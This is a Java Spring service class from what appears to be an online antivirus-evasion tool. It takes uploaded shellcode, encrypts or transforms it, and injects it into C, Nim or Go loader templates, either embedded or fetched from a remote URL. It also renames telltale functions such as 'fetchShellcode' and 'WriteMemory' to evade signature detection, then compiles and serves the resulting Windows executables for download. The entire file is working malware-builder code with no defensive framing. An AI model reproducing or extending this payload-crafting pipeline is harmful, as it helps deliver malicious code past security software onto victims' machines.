package com.yutian4060.avevasioncraftonline.service.impl;

import com.yutian4060.avevasioncraftonline.config.BypassAVConfigProperties;
import com.yutian4060.avevasioncraftonline.dto.CompilationResponseDTO;
import com.yutian4060.avevasioncraftonline.dto.ShellcodeUploadDTO;
import com.yutian4060.avevasioncraftonline.service.CompileService;
import com.yutian4060.avevasioncraftonline.utils.CompilerCode;
import com.yutian4060.avevasioncraftonline.utils.FileUtils;
import com.yutian4060.avevasioncraftonline.utils.ShellcodeProcessor;
import com.yutian4060.avevasioncraftonline.utils.TextFileProcessor;
import jakarta.annotation.PostConstruct;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.List;

import static com.yutian4060.avevasioncraftonline.utils.CompilerCode.getRandomDirectorName;

@Service
public class CompileServiceImpl implements CompileService {

    public static BypassAVConfigProperties bypassAVConfigProperties;
    private static final Logger logger = LoggerFactory.getLogger(CompileServiceImpl.class);
    private static String WORKING_DIRECTORY;
    private static String DOWNLOAD_DIRECTORY;
    private static String TEMPLATE_DIRECTORY;

    @Autowired
    public void setApplicationProperties(BypassAVConfigProperties bypassAVConfigProperties) {
        CompileServiceImpl.bypassAVConfigProperties = bypassAVConfigProperties;
    }

    @PostConstruct
    private void initializeConstants() {
        WORKING_DIRECTORY = bypassAVConfigProperties.getCompilerWorkDirectory();
        DOWNLOAD_DIRECTORY = bypassAVConfigProperties.getStorageDirectory();
        TEMPLATE_DIRECTORY = bypassAVConfigProperties.getTemplatesDirectory();
    }
    public static final int RANDOM_FILENAME_LEN = 8; // 目标文件随机名称长度

    private static final List<String> functionNamesToReplace = Arrays.asList(
            // c
            "calc_payload", "payload_len", "calcSt", "calcTH", "oldProtectCalc", "x2Ldrx", "XOR",
            // nim
            "tId", "tHandle", "pHandle", "rPtr", "bytesWritten",
            // golang
            "fetchShellcode", "delayedLoading", "checkDomain", "DecryptData", "Ldr1", "WriteMemory", "XorDecrypt"
    );

    static final String TEMPLATE_LOCAL_FILENAME = "{{LOCAL_FILENAME}}";
    static final String TEMPLATE_REMOTE_URL = "{{REMOTE_URL}}";
    static final String TEMPLATE_ICON_PLACEHOLDER = "{{ICON}}";
    static final String TEMPLATE_KEY_PLACEHOLDER = "{{Key}}";
    static final String TEMPLATE_LEN_PLACEHOLDER = "{{Len}}";
    static final String TEMPLATE_SHELLCODE_PLACEHOLDER = "{{Shellcode}}";

    @Override
    public CompilationResponseDTO compileCodeC(ShellcodeUploadDTO shellcodeUploadDTO) throws IOException {
        byte[] shellcodeByte = shellcodeUploadDTO.getShellcode().getBytes();
        // 初始化工作目录
        ShellcodeUploadDTO.StorageType storageType = shellcodeUploadDTO.getStorageType();
        String randomDirectorName = getRandomDirectorName();
        Path workingDirectory = Path.of(WORKING_DIRECTORY, randomDirectorName);
        String randomFileName = TextFileProcessor.generateRandomString(RANDOM_FILENAME_LEN);
        String downloadPath = DOWNLOAD_DIRECTORY + File.separator + randomDirectorName;
        Path destinationPath = workingDirectory.resolve(randomFileName + ".c");

        try {
            // 创建工作目录（如果不存在）
            Files.createDirectories(workingDirectory);
            String transformedShellcode = ShellcodeProcessor.transformation(shellcodeByte, shellcodeUploadDTO.getTransformation(), destinationPath);
            logger.info("Random key: {}", ShellcodeProcessor.getKey());
//            logger.info("Transformation Shellcode: {}", transformedShellcode);
            String sourceFilePath = TEMPLATE_DIRECTORY + File.separator + shellcodeUploadDTO.getTemplateLanguage()
                    + File.separator + shellcodeUploadDTO.getTemplateName() +  File.separator + shellcodeUploadDTO.getTransformation() +
                    File.separator + storageType + File.separator + shellcodeUploadDTO.getTemplateName() + ".c";

            // 将源文件复制到编译工作目录下，并使用随机文件名
            Files.copy(Path.of(sourceFilePath), destinationPath, StandardCopyOption.REPLACE_EXISTING);
            byte[] fileContent = Files.readAllBytes(destinationPath);
            String content = new String(fileContent);

            // 替换函数名称、SHELLCODE、KEY
            content = TextFileProcessor.replaceFunctionNames(content, functionNamesToReplace);
            // 载入方式
            switch (storageType) {
                case LOCAL -> content = content.replace(TEMPLATE_LOCAL_FILENAME, shellcodeUploadDTO.getAdditionalParameter());
                case REMOTE -> content = content.replace(TEMPLATE_REMOTE_URL, shellcodeUploadDTO.getAdditionalParameter());
            }
            content = content.replace(TEMPLATE_SHELLCODE_PLACEHOLDER, transformedShellcode)
                    .replace(TEMPLATE_KEY_PLACEHOLDER, ShellcodeProcessor.getKey())
                    .replace(TEMPLATE_LEN_PLACEHOLDER, String.valueOf(shellcodeByte.length));
            logger.info("destinationPath： {}", destinationPath);
            Files.write(destinationPath, content.getBytes());

            // 编译
            CompilerCode.compileC(String.valueOf(destinationPath), randomDirectorName);

            // 保存为 zip 并清除工作环境
            FileUtils.saveFileZIP(randomDirectorName,destinationPath + ".exe", destinationPath + ".bin", downloadPath);
            FileUtils.deleteDirectory(workingDirectory);


            return new CompilationResponseDTO("/download/" + randomDirectorName + ".zip");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public CompilationResponseDTO compileCodeNim(ShellcodeUploadDTO shellcodeUploadDTO) throws IOException {
        byte[] shellcodeByte = shellcodeUploadDTO.getShellcode().getBytes();
        // 初始化工作目录
        ShellcodeUploadDTO.StorageType storageType = shellcodeUploadDTO.getStorageType();
        String randomDirectorName = getRandomDirectorName();
        Path workingDirectory = Path.of(WORKING_DIRECTORY, randomDirectorName);
        String randomFileName = TextFileProcessor.generateRandomString(RANDOM_FILENAME_LEN);
        String downloadPath = DOWNLOAD_DIRECTORY + File.separator + randomDirectorName;
        Path destinationPath = workingDirectory.resolve(randomFileName + ".nim");

        try {
            // 创建工作目录（如果不存在）
            Files.createDirectories(workingDirectory);
            String transformedShellcode = ShellcodeProcessor.transformation(shellcodeByte, shellcodeUploadDTO.getTransformation(), destinationPath);
            logger.info("Random key: {}", ShellcodeProcessor.getKey());
//            logger.info("Transformation Shellcode: {}", transformedShellcode);
            String sourceFilePath = TEMPLATE_DIRECTORY + File.separator + shellcodeUploadDTO.getTemplateLanguage()
                    + File.separator + shellcodeUploadDTO.getTemplateName() + File.separator + shellcodeUploadDTO.getTransformation() +
                    File.separator + storageType + File.separator  + shellcodeUploadDTO.getTemplateName() + ".nim";

            // 将源文件复制到编译工作目录下，并使用随机文件名
            Files.copy(Path.of(sourceFilePath), destinationPath, StandardCopyOption.REPLACE_EXISTING);
            byte[] fileContent = Files.readAllBytes(destinationPath);
            String content = new String(fileContent);

            // 替换函数名称、SHELLCODE、KEY
            content = TextFileProcessor.replaceFunctionNames(content, functionNamesToReplace);
            // 载入方式
            switch (storageType) {
                case LOCAL -> content = content.replace(TEMPLATE_LOCAL_FILENAME, shellcodeUploadDTO.getAdditionalParameter());
                case REMOTE -> content = content.replace(TEMPLATE_REMOTE_URL, shellcodeUploadDTO.getAdditionalParameter());
            }
            content = content.replace(TEMPLATE_SHELLCODE_PLACEHOLDER, transformedShellcode)
                    .replace(TEMPLATE_KEY_PLACEHOLDER, ShellcodeProcessor.getKey())
                    .replace(TEMPLATE_LEN_PLACEHOLDER, String.valueOf(shellcodeByte.length));
            logger.info("destinationPath： {}", destinationPath);
            Files.write(destinationPath, content.getBytes());

            // 编译
            CompilerCode.compileNim(String.valueOf(destinationPath), randomDirectorName);

            // 保存为 zip 并清除工作环境
            FileUtils.saveFileZIP(randomDirectorName,destinationPath + ".exe", destinationPath + ".bin", downloadPath);
            FileUtils.deleteDirectory(workingDirectory);


            return new CompilationResponseDTO("/download/" + randomDirectorName + ".zip");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public CompilationResponseDTO compileCodeGo(ShellcodeUploadDTO shellcodeUploadDTO) throws IOException {
        byte[] shellcodeByte = shellcodeUploadDTO.getShellcode().getBytes();
        // 初始化工作目录
        ShellcodeUploadDTO.StorageType storageType = shellcodeUploadDTO.getStorageType();
        String randomDirectorName = getRandomDirectorName();
        Path workingDirectory = Path.of(WORKING_DIRECTORY, randomDirectorName);
        String randomFileName = TextFileProcessor.generateRandomString(RANDOM_FILENAME_LEN);
        String downloadPath = DOWNLOAD_DIRECTORY + File.separator + randomDirectorName;
        Path destinationPath = workingDirectory.resolve(randomFileName + ".go");

        try {
            // 创建工作目录（如果不存在）
            Files.createDirectories(workingDirectory);
            String transformedShellcode = ShellcodeProcessor.transformation(shellcodeByte, shellcodeUploadDTO.getTransformation(), destinationPath);
            logger.info("Random key: {}", ShellcodeProcessor.getKey());
//            logger.info("Transformation Shellcode: {}", transformedShellcode);
            String baseSourceFilePath = TEMPLATE_DIRECTORY + File.separator + shellcodeUploadDTO.getTemplateLanguage()
                    + File.separator + shellcodeUploadDTO.getTemplateName() + File.separator + shellcodeUploadDTO.getTransformation() +
                    File.separator + storageType + File.separator;

            String sourceFilePath = baseSourceFilePath + shellcodeUploadDTO.getTemplateName() + ".go";
            String goModFilePath = baseSourceFilePath +  "go.mod";
            String goSumFilePath = baseSourceFilePath + "go.sum";
            // 将源文件复制到编译工作目录下，并使用随机文件名
            Files.copy(Path.of(sourceFilePath), destinationPath, StandardCopyOption.REPLACE_EXISTING);
            Files.copy(Path.of(goModFilePath), Path.of(String.valueOf(workingDirectory), "go.mod"), StandardCopyOption.REPLACE_EXISTING);
            Files.copy(Path.of(goSumFilePath), Path.of(String.valueOf(workingDirectory), "go.sum"), StandardCopyOption.REPLACE_EXISTING);
            byte[] fileContent = Files.readAllBytes(destinationPath);
            String content = new String(fileContent);

            // 替换函数名称、SHELLCODE、KEY
            content = TextFileProcessor.replaceFunctionNames(content, functionNamesToReplace);
            // 载入方式
            switch (storageType) {
                case LOCAL -> content = content.replace(TEMPLATE_LOCAL_FILENAME, shellcodeUploadDTO.getAdditionalParameter());
                case REMOTE -> content = content.replace(TEMPLATE_REMOTE_URL, shellcodeUploadDTO.getAdditionalParameter());
            }
            content = content.replace(TEMPLATE_SHELLCODE_PLACEHOLDER, transformedShellcode)
                    .replace(TEMPLATE_KEY_PLACEHOLDER, ShellcodeProcessor.getKey())
                    .replace(TEMPLATE_LEN_PLACEHOLDER, String.valueOf(shellcodeByte.length));
            logger.info("destinationPath： {}", destinationPath);
            Files.write(destinationPath, content.getBytes());

            // 编译
            CompilerCode.compileGo(String.valueOf(destinationPath), randomDirectorName);

            // 保存为 zip 并清除工作环境
            FileUtils.saveFileZIP(randomDirectorName,destinationPath + ".exe", destinationPath + ".bin", downloadPath);
            FileUtils.deleteDirectory(workingDirectory);


            return new CompilationResponseDTO("/download/" + randomDirectorName + ".zip");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

}
